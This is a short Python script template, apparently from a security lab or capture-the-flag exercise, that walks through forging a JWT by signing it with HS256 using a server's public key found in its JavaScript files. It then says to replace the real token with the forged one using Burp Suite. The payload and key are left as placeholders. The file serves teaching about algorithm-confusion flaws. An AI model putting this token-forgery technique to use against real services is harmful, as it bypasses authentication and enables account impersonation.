import jwt
from datetime import datetime, timedelta

# Step 1: Enter the public key of the server
# The Public Key you should have found by exploring the servers js files
public_key = '''Paste the public key for the server here'''     

# Step 2: Craft the forged token
# Design a payload so that it resembles the token you decoded earlier 
# hint: the "exp" field should be set with datetime.utcnow() + timedelta(minutes=10)
payload = {}


# Step 3: Set the payload with the required fields
# Since the server is expecting decoded JWT, you cannot just sent the bytes you need to decode with utf-8
token = jwt.encode(payload, public_key, algorithm="HS256").decode("utf-8")

# Step 4: Use this token along with burp suite or any other proxy tool to intercept the request and replace the original token with the forged one
print(f"Forged token: {token}")

